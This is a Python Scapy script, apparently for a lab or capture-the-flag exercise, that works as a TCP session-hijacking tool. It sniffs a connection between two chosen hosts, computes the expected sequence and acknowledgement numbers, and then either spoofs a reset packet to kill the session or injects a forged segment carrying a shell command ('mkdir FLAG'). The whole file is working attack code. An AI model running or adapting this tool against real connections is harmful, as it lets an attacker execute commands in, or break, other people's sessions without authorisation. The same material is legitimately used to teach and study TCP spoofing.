#!/usr/bin/env python3

from scapy.all import *
from scapy.layers.inet import IP, TCP
from scapy.packet import Raw, Packet
import argparse
import sys

DEFAULT_INTERFACE = "eth0"
PAYLOAD = "mkdir FLAG\r"

def parse_args():
    p = argparse.ArgumentParser(description="TCP/IP Injection Tool")
    p.add_argument("-i", "--interface", default=DEFAULT_INTERFACE)
    p.add_argument("-src", "--source")
    p.add_argument("-dst", "--destination")
    p.add_argument("-sp", "--sport")
    p.add_argument("-dp", "--dport")
    p.add_argument("-R", "--reset", default=False)
    return p.parse_args()

def RST_Injection(src:str, dst:str, sport:int, dport:int, pkt:Packet) -> bool:
    next_seq = 0
    if(pkt[IP].src == dst): # IF packet captured source us the same as destination then use ACK as SEQ
        next_seq = pkt[TCP].ack
    else:  # if packet captured destination is the same as the spoofed packet destination. Calculate next expected sequence. seq + payload size + 1 if S + 1 if F
        next_seq = pkt[TCP].seq + (len(pkt[Raw].load) if "Raw" in pkt else 0) + (1 if "S" in pkt[TCP].flags else 0) + (1 if "F" in pkt[TCP].flags else 0)

    ip = IP(src=src, dst=dst)
    tcp = TCP(sport=sport, dport=dport, seq=next_seq, flags="R")
    send(ip/tcp)
    return True

def PAYLOAD_Injection(src:str, dst:str, sport:int, dport:int, pkt:Packet) -> bool:
    ack = 0
    next_seq = 0
    if(pkt[IP].src == dst): # IF packet captured source is the same as the destination then use ACK as SEQ (same as if the sniffed packet destination != spoofed packet destination)
        next_seq = pkt[TCP].ack
        ack = pkt[TCP].seq + (len(pkt[Raw].load) if "Raw" in pkt else 0) + (1 if "S" in pkt[TCP].flags else 0) + (1 if "F" in pkt[TCP].flags else 0)
    else: # if packet captured destination is the same as the spoofed packet destination. Calculate next expected sequence. seq + payload size + 1 if S + 1 if F
        next_seq = pkt[TCP].seq + (len(pkt[Raw].load) if "Raw" in pkt else 0) + (1 if "S" in pkt[TCP].flags else 0) + (1 if "F" in pkt[TCP].flags else 0)
        ack = pkt[TCP].ack

    ip = IP(src=src, dst=dst)
    tcp = TCP(sport=sport, dport=dport, seq=next_seq, ack=ack, flags="PA")
    send(ip/tcp/Raw(load=PAYLOAD))

    return True

def main():
    args = parse_args()
    iface = args.interface
    src = args.source
    dst = args.destination
    sport = int(args.sport)
    dport = int(args.dport)
    reset = args.reset

    print(f"Interface {iface} selected.")
    bpf = f"tcp port {dport} and (host {src} and host {dst})"

    # Packet callback
    def handle_packet(pkt:Packet):
        if reset:
            return RST_Injection(src=src, dst=dst, sport=sport, dport=dport, pkt=pkt)
        else:
            return PAYLOAD_Injection(src=src, dst=dst, sport=sport, dport=dport, pkt=pkt)

    # Start Sniffer
    try:
        sniff(iface=iface, prn=handle_packet ,filter=bpf, count=1)
    except PermissionError:
        print("Permission error: run with sudo/root.")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\nAborted by user.")
        sys.exit(0)

if __name__ == "__main__":
    main()